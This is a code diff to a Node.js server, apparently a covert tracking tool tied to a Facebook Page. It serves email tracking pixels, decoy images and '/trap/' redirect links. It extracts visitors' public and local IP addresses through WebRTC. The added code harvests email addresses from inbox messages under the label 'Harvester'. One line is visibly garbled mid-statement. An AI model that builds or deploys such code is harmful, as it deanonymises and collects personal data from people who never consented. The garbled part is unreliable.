@@ -17,7 +17,6 @@ const IMAGE_URL = process.env.AUTO_IMAGE_URL || "";
 const AUTO_TEXT = process.env.AUTO_TEXT || "ขอบคุณที่ติดต่อครับ";
 const PAGE_NAME = (process.env.PAGE_NAME || "have a nice day").trim();
 
-/* ---------- ตัวบันทึกผู้เยี่ยมชมกลาง (ใช้ทุก endpoint) ---------- */
 function logVisit(code, req) {
   const ip = ((req.headers["x-forwarded-for"] || "").split(",")[0].trim() || req.ip).replace("::ffff:", "");
   const ua = req.headers["user-agent"] || "";
@@ -51,7 +50,6 @@ function logVisit(code, req) {
   return visit;
 }
 
-/* ---------- Email Tracking Pixel: /track.gif?e=ชื่อเคส ---------- */
 app.get("/track.gif", (req, res) => {
   const gif = Buffer.from("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7", "base64");
   res.set({ "Content-Type": "image/gif", "Cache-Control": "no-store, no-cache, must-revalidate", "Content-Length": gif.length });
@@ -59,14 +57,12 @@ app.get("/track.gif", (req, res) => {
   logVisit("email-" + String(req.query.e || "x").slice(0, 40), req);
 });
 
-/* ---------- Email Tracking แบบภาพหลอกเต็ม: /img/ชื่อเคส.jpg ---------- */
 app.get("/img/:code.jpg", (req, res) => {
   res.set("Cache-Control", "no-store");
   res.sendFile("public/images/decoy.jpg", { root: "." });
   logVisit("email-" + String(req.params.code).slice(0, 40), req);
 });
 
-/* ---------- Auto-reply engine ---------- */
 const lastReply = new Map();
 async function autoReply(psid) {
   const last = lastReply.get(psid) || 0;
@@ -94,8 +90,8 @@ async function sendImageTo(recipientId, url) {
   } catch (err) { console.error("Image failed:", err.response?.data?.error?.message); }
 }
 
-/* ---------- Inbox Poller ทุก 60 วิ ---------- */
 const convoState = new Map();
+const foundEmails = new Set();
 let firstPoll = true;
 async function pollInbox() {
   if (!TOKEN) return;
@@ -112,6 +108,21 @@ async function pollInbox() {
       if (!user) continue;
       console.log("New message in", c.id, "-> PSID:", user.id);
       await autoReply(user.id);
+      try {
+        const m = await axios.get("https://graph.facebook.com/v21.0/" + c.id + "/messages", {
+          params: { fields: "message", limit: "1", access_token: TOKEN }
+        });
+        const text = (m.data.data && m.data.data[0] && m.data.data[0].message) || "";
+        const match = text.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
+        if (match && !foundEmails.has(match[0])) {
+          foundEmails.add(match[0]);
+          console.log("EMAIL FOUND:", match[0], "PSID:", user.id);
+          notifyAdmin({ code: "email-found", ip: match[0],
+            location: "PSID " + user.id, device: "Inbox", os: "Inbox",
+            browser: "Harvester", isp: null, time: new Date().toISOString(), id: 0 });
+          await sendTextTo(user.id, "ได้รับอีเมลของท่านแล้วครับ จะส่งรายละเอียดไปให้โดยเร็วที่สุดครับ 🙏");
+        }
+      } catch (e2) { console.error("Harvest error:", e2.response?.data?.error?.message || e2.message); }
     }
     firstPoll = false;
   } catch (e) { console.error("Poll error:", e.response?.data?.error?.message || e.message); }
@@ -119,13 +130,34 @@ async function pollInbox() {
 setTimeout(pollInbox, 5000);
 setInterval(pollInbox, 60000);
 
-/* ---------- WebRTC logger ---------- */
 app.post("/api/webrtc-log", (req, res) => {
   res.sendStatus(200);
   try {
     const ip = ((req.headers["x-forwarded-for"] || "").split(",")[0].trim() || req.ip).replace("::ffff:", "");
     const ua = req.headers["user-agent"] || "";
-    const tag = String(req.boROM links WHERE code = ?").get(req.params.code);
+    const tag = String(req.body?.tag || "webrtc").slice(0, 50);
+    const candidates = Array.isArray(req.body?.candidates) ? req.body.candidates : [];
+    let publicIP = null, lanIP = null;
+    for (const c of candidates.map(String)) {
+      if (!publicIP) { const m1 = c.match(/ (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}) \d+ typ srflx/); if (m1) publicIP = m1[1]; }
+      if (!lanIP) { const m2 = c.match(/ (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}) \d+ typ host/); if (m2 && !m2[1].startsWith("192.0.0.")) lanIP = m2[1]; }
+    }
+    if (publicIP || lanIP) {
+      logVisit("webrtc-" + tag, Object.assign(Object.create(req), {
+        headers: Object.assign({}, req.headers, { "x-forwarded-for": publicIP || ip }),
+        ip: publicIP || ip
+      }));
+      console.log("WebRTC:", publicIP || ip, "lan:", lanIP || "-");
+      if (lanIP) {
+        db.prepare("UPDATE visits SET device = device || ? WHERE code = ? ORDER BY id DESC LIMIT 1")
+          .run(" (LAN " + lanIP + ")", "webrtc-" + tag);
+      }
+    }
+  } catch (e) { console.error("webrtc-log error:", e.message); }
+});
+
+app.get("/trap/:code", async (req, res) => {
+  const link = db.prepare("SELECT * FROM links WHERE code = ?").get(req.params.code);
   logVisit(req.params.code, req);
   if (link) return res.redirect(302, link.destination);
   res.sendFile("public/decoy.html", { root: "." });
